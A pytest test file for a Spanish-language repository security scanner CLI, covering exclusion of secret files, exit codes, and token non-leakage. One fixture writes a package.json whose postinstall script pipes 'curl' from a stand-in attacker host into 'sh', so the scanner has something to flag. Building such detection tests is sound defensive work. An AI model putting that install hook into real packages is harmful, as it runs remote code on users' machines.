from __future__ import annotations

import io
import json
from pathlib import Path
import sys
from unittest import mock

import pytest

_CLI_DIR = Path(__file__).resolve().parents[1]
if str(_CLI_DIR) not in sys.path:
    sys.path.insert(0, str(_CLI_DIR))

import omega_cli  # noqa: E402
from terminal_ui import TerminalRenderer  # noqa: E402


def _make_sample_repo(tmp_path: Path, *, malicious: bool = False) -> Path:
    (tmp_path / ".gitignore").write_text("dist/\n*.log\n!important.log\n", encoding="utf-8")
    (tmp_path / ".env").write_text("SECRET=123\n", encoding="utf-8")
    (tmp_path / ".env.production").write_text("PROD_SECRET=456\n", encoding="utf-8")
    (tmp_path / "private.pem").write_text("-----BEGIN PRIVATE KEY-----\n", encoding="utf-8")
    (tmp_path / "app.log").write_text("debug log\n", encoding="utf-8")
    (tmp_path / "important.log").write_text("keep me\n", encoding="utf-8")
    (tmp_path / "dist").mkdir()
    (tmp_path / "dist" / "bundle.js").write_text("console.log(1)\n", encoding="utf-8")
    (tmp_path / ".git").mkdir()
    (tmp_path / ".git" / "config").write_text("[core]\n", encoding="utf-8")

    if malicious:
        pkg = {
            "name": "demo-app",
            "version": "1.0.0",
            "scripts": {"postinstall": "curl -s https://evil.test/a.sh | sh"},
        }
    else:
        pkg = {"name": "demo-app", "version": "1.0.0", "scripts": {"test": "node --test"}}
    (tmp_path / "package.json").write_text(json.dumps(pkg), encoding="utf-8")
    return tmp_path


def test_collect_excludes_secrets_and_respects_gitignore_even_with_include_ignored(tmp_path: Path):
    repo = _make_sample_repo(tmp_path)

    files, excluded = omega_cli.collect_repo_files(repo, include_ignored=False)
    rels = {rel for _, rel in files}
    assert "package.json" in rels
    assert "important.log" in rels
    assert "app.log" not in rels
    assert "dist/bundle.js" not in rels
    assert ".env" not in rels
    assert ".env.production" not in rels
    assert "private.pem" not in rels
    assert ".git/config" not in rels
    assert excluded["secretos"] == 3
    assert excluded["gitignore"] >= 2
    assert excluded["directorios_internos"] >= 1

    # Con --include-ignored: incluye .gitignore pero NUNCA secretos ni .git
    files_inc, excluded_inc = omega_cli.collect_repo_files(repo, include_ignored=True)
    rels_inc = {rel for _, rel in files_inc}
    assert "app.log" in rels_inc
    assert "dist/bundle.js" in rels_inc
    assert ".env" not in rels_inc
    assert "private.pem" not in rels_inc
    assert ".git/config" not in rels_inc
    assert excluded_inc["secretos"] == 3


def test_offline_scan_exit_codes_and_terminal_output(tmp_path: Path):
    repo = _make_sample_repo(tmp_path, malicious=True)
    out = io.StringIO()
    err = io.StringIO()

    code = omega_cli.main(
        ["scan", str(repo), "--offline", "--fail-on", "HIGH"],
        stdout=out,
        stderr=err,
    )
    assert code == omega_cli.EXIT_FINDINGS
    assert "NPM-POSTINSTALL-EXEC-01" in out.getvalue()
    assert "Excluidos -> secretos: 3" in err.getvalue()
    assert "\x1b[" not in out.getvalue()  # non-TTY StringIO -> sin escapes ANSI


def test_clean_offline_scan_returns_0_and_honest_message(tmp_path: Path):
    repo = _make_sample_repo(tmp_path, malicious=False)
    out = io.StringIO()
    err = io.StringIO()

    code = omega_cli.main(["scan", str(repo), "--offline", "--fail-on", "LOW"], stdout=out, stderr=err)
    assert code == omega_cli.EXIT_CLEAN
    assert "Sin señales detectadas con las reglas actuales" in out.getvalue()
    assert "repo seguro" not in out.getvalue().lower()


def test_http_non_localhost_rejected_and_token_never_leaked(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    repo = _make_sample_repo(tmp_path)
    secret = "omega_scan_never_leak_this_token_999"
    monkeypatch.setenv("OMEGA_API_TOKEN", secret)
    out = io.StringIO()
    err = io.StringIO()

    code = omega_cli.main(
        ["scan", str(repo), "--url", "http://api.example.com:8080"],
        stdout=out,
        stderr=err,
    )
    assert code == omega_cli.EXIT_NETWORK_AUTH
    assert secret not in out.getvalue()
    assert secret not in err.getvalue()


def test_cli_token_flag_warns_and_never_leaks(tmp_path: Path):
    repo = _make_sample_repo(tmp_path)
    secret = "omega_scan_cli_flag_secret_12345"
    out = io.StringIO()
    err = io.StringIO()

    with mock.patch.object(
        omega_cli,
        "upload_archive_scan",
        return_value={"scan_id": "s1", "status": "COMPLETED", "files_scanned": 2, "score": 0, "findings": []},
    ):
        code = omega_cli.main(
            ["scan", str(repo), "--url", "http://127.0.0.1:8080", "--token", secret, "--format", "sarif"],
            stdout=out,
            stderr=err,
        )
    assert code == omega_cli.EXIT_CLEAN
    assert "Riesgo de seguridad" in err.getvalue()
    assert secret not in out.getvalue()
    assert secret not in err.getvalue()
    sarif = json.loads(out.getvalue())
    assert sarif["version"] == "2.1.0"


def test_local_limits_exceeded_returns_exit_4(tmp_path: Path):
    for i in range(6):
        (tmp_path / f"f{i}.txt").write_text("ok", encoding="utf-8")
    with pytest.raises(ValueError):
        omega_cli.collect_repo_files(tmp_path, max_files=3)

    out = io.StringIO()
    err = io.StringIO()
    with mock.patch.object(omega_cli, "collect_repo_files", side_effect=ValueError("límite local superado")):
        code = omega_cli.main(["scan", str(tmp_path), "--offline"], stdout=out, stderr=err)
    assert code == omega_cli.EXIT_LIMITS


def test_terminal_renderer_ascii_fallback_and_no_color(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setenv("NO_COLOR", "1")
    buf = io.StringIO()
    ui = TerminalRenderer(buf, force_ascii=True)
    ui.step("Paquete verificado")
    assert "[OK] Paquete verificado" in buf.getvalue()
    assert "\x1b[" not in buf.getvalue()
